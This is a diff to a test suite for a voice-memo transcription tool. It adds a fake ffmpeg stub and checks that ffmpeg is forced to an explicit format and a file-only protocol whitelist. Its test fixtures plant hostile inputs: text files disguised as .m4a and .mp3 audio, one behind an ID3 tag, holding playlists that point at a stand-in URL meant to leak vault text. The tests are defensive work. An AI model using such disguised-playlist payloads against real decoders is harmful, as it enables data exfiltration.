@@ -490,6 +490,17 @@ print("" if "SILENT" in text else text)
 '''
 
 
+FAKE_FFMPEG = r'''
+import json, os, sys
+a = sys.argv[1:]
+with open(os.environ["FAKE_FFMPEG_LOG"], "a", encoding="utf-8") as fh:
+    fh.write(json.dumps(a) + "\n")
+if a[a.index("-f") + 1] != "ogg":
+    sys.exit("cannot decode")           # stands in for a real decoder failing on a fake file
+open(a[-1], "wb").write(open(a[a.index("-i") + 1], "rb").read())
+'''
+
+
 def check_transcribe(tmp):
     """Voice memos: transcribed by whatever engine is there, filed as an
     ordinary capture, the audio kept and embedded — and a memo the engine
@@ -500,7 +511,11 @@ def check_transcribe(tmp):
     fake = os.path.join(tmp, "fake_stt.py")
     with open(fake, "w", encoding="utf-8") as fh:
         fh.write(FAKE_STT)
-    env = dict(os.environ, BRAINWARDEN_TRANSCRIBER=json.dumps([sys.executable, fake, "{audio}"]))
+    ffm, ffm_log = os.path.join(tmp, "fake_ffmpeg.py"), os.path.join(tmp, "ffmpeg.log")
+    with open(ffm, "w", encoding="utf-8") as fh:
+        fh.write(FAKE_FFMPEG)
+    env = dict(os.environ, BRAINWARDEN_TRANSCRIBER=json.dumps([sys.executable, fake, "{audio}"]),
+               BRAINWARDEN_FFMPEG=json.dumps([sys.executable, ffm]), FAKE_FFMPEG_LOG=ffm_log)
     script = os.path.join(vault, ".tools", "transcribe.py")
 
     def tr(*args, env_=None):
@@ -528,10 +543,12 @@ def check_transcribe(tmp):
     audio("00-inbox/voice/quiet.opus", "SILENT")
     # text dressed as audio: a playlist would make ffmpeg fetch its URLs — it must reach no engine
     put("00-inbox/planted.m4a", "#EXTM3U\n#EXTINF:1,\nhttps://example.invalid/?leak=vault-text\n")
+    # and behind an ID3 tag, which a guessing ffmpeg skips before it guesses
+    put("00-inbox/tagged.mp3", "ID3\x04\x00\x00\x00\x00\x00\x00#EXTM3U\nhttps://example.invalid/?leak=1\n")
     r = tr()
     notes = inbox()
     good = [n for n in notes if "idee-fuer-hotels-in-tirol" in n]
-    if r.returncode != 1 or len(notes) != 2 or not good:
+    if r.returncode != 1 or len(notes) != 2 or not good:   # bad.ogg and tagged.mp3 fail, two notes
         return bad(label, f"first run: exit {r.returncode}, notes {notes} {r.stdout.strip()[-150:]}")
     text = open(os.path.join(vault, "00-inbox", good[0]), encoding="utf-8").read()
     if "zuerst die mit Kinderkino" not in text or "![[Neue Aufnahme.m4a]]" not in text \
@@ -543,6 +560,12 @@ def check_transcribe(tmp):
         return bad(label, "a memo the engine failed on was moved or lost instead of left for the next try")
     if not exists("00-inbox/planted.m4a") or "planted.m4a" not in r.stdout or "not an audio recording" not in r.stdout:
         return bad(label, "a text file named .m4a was handed to the speech engine")
+    calls = [json.loads(l) for l in open(ffm_log, encoding="utf-8")]
+    loose = [c for c in calls if "-f" not in c or c[c.index("-protocol_whitelist") + 1:][:1] != ["file"]
+             if "-protocol_whitelist" in c] + [c for c in calls if "-protocol_whitelist" not in c]
+    if loose or ["mp3"] != [c[c.index("-f") + 1] for c in calls if "tagged" in "".join(c) or c[c.index("-f") + 1] == "mp3"] \
+            or any("00-inbox" in x for c in calls for x in c) or not exists("00-inbox/tagged.mp3"):
+        return bad(label, f"ffmpeg was let guess the format, reach beyond files or read the inbox itself: {calls}")
     quiet = [n for n in notes if n not in good]
     if "No speech recognised" not in open(os.path.join(vault, "00-inbox", quiet[0]), encoding="utf-8").read():
         return bad(label, "a silent recording did not say so")
@@ -554,6 +577,7 @@ def check_transcribe(tmp):
         return bad(label, "hygiene reports the embedded recording as a dead link")
     os.remove(os.path.join(vault, "00-inbox", "bad.ogg"))
     os.remove(os.path.join(vault, "00-inbox", "planted.m4a"))
+    os.remove(os.path.join(vault, "00-inbox", "tagged.mp3"))
     # the engine runs in an empty folder: `python -c` would import modules planted in the vault
     audio("00-inbox/cwd.m4a", "CWD")
     tr()
